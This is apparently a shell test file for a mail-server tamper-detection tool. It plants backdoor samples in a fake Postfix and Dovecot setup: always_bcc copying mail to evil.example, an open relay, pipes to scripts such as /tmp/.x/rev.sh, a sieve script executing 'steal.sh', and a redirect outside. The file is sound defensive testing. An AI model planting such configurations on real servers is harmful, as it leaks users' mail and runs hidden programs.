#!/bin/sh
# Tests for roles/applications/SV-31-mail-tamper.sh.
# A fake root (--root) with a Postfix and Dovecot config full of planted
# backdoors: always_bcc, mailbox_command, an open mynetworks, relay rules
# without reject_unauth_destination, a master.cf pipe to /tmp, an alias that
# runs a program, an alias to an outside address, a .forward pipe, a sieve
# script that runs a program and one that redirects out; plus the stock
# master.cf uucp service and an amavis content_filter (not HIGH).  Checks:
# each is found at the right level; a dry run changes nothing; --batch
# --apply takes the defaults; values that hold "|" survive; the questions on
# a terminal; the undo puts every file back.  Nothing outside is touched.
. "$(dirname "$0")/helper.sh"
SH=${TEST_SHELL:-sh}
C="$T_ROOT/roles/applications/SV-31-mail-tamper.sh"
export BT_SKIP_VERIFY=1
O="$T_TMP/out"; F="$T_TMP/root"

mkroot() {
    rm -rf "$F"; mkdir -p "$F/etc/postfix" "$F/etc/dovecot" "$F/home/alice" "$F/home/bob/sieve" "$F/var/lib/dovecot/sieve"
    cat >"$F/etc/postfix/main.cf" <<'EOF'
myhostname = mail.shop.local
mydestination = $myhostname, shop.local, localhost
mynetworks = 127.0.0.0/8 0.0.0.0/0
always_bcc = copy@evil.example
mailbox_command = /tmp/.x/deliver.sh
content_filter = amavis:[127.0.0.1]:10024
smtpd_relay_restrictions = permit_mynetworks
    permit_sasl_authenticated
EOF
    cat >"$F/etc/postfix/master.cf" <<'EOF'
smtp      inet  n       -       y       -       -       smtpd
uucp      unix  -       n       n       -       -       pipe
  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
evil      unix  -       n       n       -       -       pipe
  flags=R user=nobody argv=/tmp/.x/rev.sh ${sender}
EOF
    printf 'postmaster: root\nbackup: "|/tmp/.x/run.sh"\nboss: boss@evil.example\nsales: alice@shop.local\n' >"$F/etc/aliases"
    printf 'root:x:0:0::/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/sh\nbob:x:1001:1001::/home/bob:/bin/sh\n' >"$F/etc/passwd"
    printf '| /tmp/.x/fwd.sh\n' >"$F/home/alice/.forward"
    printf 'require ["vnd.dovecot.execute"];\nexecute "steal.sh";\n' >"$F/var/lib/dovecot/sieve/global.sieve"
    printf 'require ["redirect"];\nredirect "out@evil.example";\n' >"$F/home/bob/sieve/fwd.sieve"
}
run() { $SH "$C" --root "$F" --out "$O" --no-color --box webmail "$@"; }
snap() { (cd "$F" && find . -type f | sort; find . -type f -exec cat {} +) | cksum; }

t_start "options"
$SH "$C" --box moon >/dev/null 2>&1; t_eq "$?" 2 "a bad --box exits 2"
$SH "$C" --queue x >/dev/null 2>&1; t_eq "$?" 2 "a bad --queue exits 2"
out=$($SH "$C" --help 2>&1); t_has "$out" "--domain D" "--help"

t_start "find"
mkroot; before=$(snap)
out=$(run --batch 2>&1)
t_has "$out" "[!] main.cf always_bcc: always_bcc = copy@evil.example: a copy of mail goes there" "always_bcc is HIGH"
t_has "$out" "[!] main.cf mailbox_command" "mailbox_command is HIGH"
t_has "$out" "EVERYONE may send mail through this box (open relay)" "an open mynetworks is HIGH"
t_has "$out" "relay rules without reject_unauth_destination" "relay rules without the reject are HIGH"
t_has "$out" "[*] main.cf content_filter: content_filter = amavis" "amavis is only MED"
t_has "$out" "[!] master.cf evil: a service that runs /tmp/.x/rev.sh" "a master.cf pipe to /tmp is HIGH"
t_hasnt "$out" "master.cf uucp" "the stock uucp service is not flagged"
t_has "$out" "[!] /etc/aliases line 2: mail to backup runs a program" "an alias pipe is HIGH"
t_has "$out" "[*] /etc/aliases line 3: mail to boss is sent outside: boss@evil.example" "an alias to an outside address is MED"
t_hasnt "$out" "line 4" "an alias inside our domain is fine"
t_has "$out" "[!] /home/alice/.forward: alice's mail runs a program" "a .forward pipe is HIGH"
t_has "$out" "[!] /var/lib/dovecot/sieve/global.sieve: a sieve script that runs a program" "a sieve execute is HIGH"
t_has "$out" "[*] /home/bob/sieve/fwd.sieve: a sieve script forwards mail outside: out@evil.example" "a sieve redirect out is MED"
t_has "$out" "Dry run: nothing was changed" "dry run without --apply"
t_eq "$(snap)" "$before" "a dry run changes nothing"
t_fail "no CSV files are left" sh -c "find '$O' -name '*.csv' | grep -q ."

t_start "apply the defaults (--batch)"
_u0=$(cat "$O"/undo-*.log 2>/dev/null | grep -c .)
out=$(run --batch --no-protected --apply --no-timer 2>&1)
t_has "$(cat "$F/etc/postfix/main.cf")" "#SV-31: always_bcc" "always_bcc is commented out"
t_has "$(cat "$F/etc/postfix/main.cf")" "#SV-31: mailbox_command" "mailbox_command too"
t_has "$(cat "$F/etc/postfix/main.cf")" "mynetworks = 127.0.0.0/8 [::1]/128" "mynetworks is this box only"
t_has "$(cat "$F/etc/postfix/main.cf")" "#SV-31:     permit_sasl_authenticated" "a continuation line goes with its setting"
t_has "$(cat "$F/etc/postfix/main.cf")" "smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated reject_unauth_destination" "the relay rules get the reject"
t_has "$(cat "$F/etc/postfix/main.cf")" "content_filter = amavis" "amavis stays (MED: no by default)"
t_has "$(cat "$F/etc/postfix/master.cf")" "#SV-31: evil" "the evil service is commented out"
t_has "$(cat "$F/etc/postfix/master.cf")" "#SV-31:   flags=R user=nobody" "with its argv line"
t_has "$(cat "$F/etc/postfix/master.cf")" "uucp      unix" "uucp stays"
t_has "$(cat "$F/etc/aliases")" '#SV-31: backup: "|/tmp/.x/run.sh"' "the alias pipe is commented out"
t_has "$(cat "$F/etc/aliases")" "boss: boss@evil.example" "the outside alias stays (MED: no by default)"
t_fail "the .forward is quarantined" test -f "$F/home/alice/.forward"
t_fail "the sieve execute is quarantined" test -f "$F/var/lib/dovecot/sieve/global.sieve"
t_ok "the sieve redirect stays (MED)" test -f "$F/home/bob/sieve/fwd.sieve"
cat "$O"/undo-*.log | awk -F'\t' -v n="$_u0" 'NR > n { l[NR] = $4 } END { for (i = NR; i > n; i--) print l[i] }' >"$T_TMP/undo.sh"
sh "$T_TMP/undo.sh" >/dev/null 2>&1
t_eq "$(snap)" "$before" "undo puts every file back"

t_start "questions on a terminal"
if command -v script >/dev/null 2>&1; then
    mkroot
    # in order: always_bcc y, mailbox_command n, content_filter y, mynetworks y, relay n,
    #           evil y, backup y, boss y, .forward n, global.sieve y, fwd.sieve n; apply Enter
    printf 'y\nn\ny\ny\nn\ny\ny\ny\nn\ny\nn\n\n' >"$T_TMP/ans"
    tt=$(BT_NO_TTY=0 script -qc "$SH '$C' --root '$F' --out '$O' --no-color --box webmail --no-protected --apply --no-timer" /dev/null <"$T_TMP/ans" 2>&1)
    t_has "$tt" "[y] yes, remove always_bcc from main.cf" "each fix spells out its answers"
    t_has "$(cat "$F/etc/postfix/main.cf")" "mailbox_command = /tmp/.x/deliver.sh" "n: mailbox_command stays"
    t_has "$(cat "$F/etc/postfix/main.cf")" "#SV-31: content_filter" "y on a MED: content_filter goes"
    t_has "$(cat "$F/etc/aliases")" "#SV-31: boss" "y on a MED: the outside alias goes"
    t_ok "n: the .forward stays" test -f "$F/home/alice/.forward"
fi
t_done
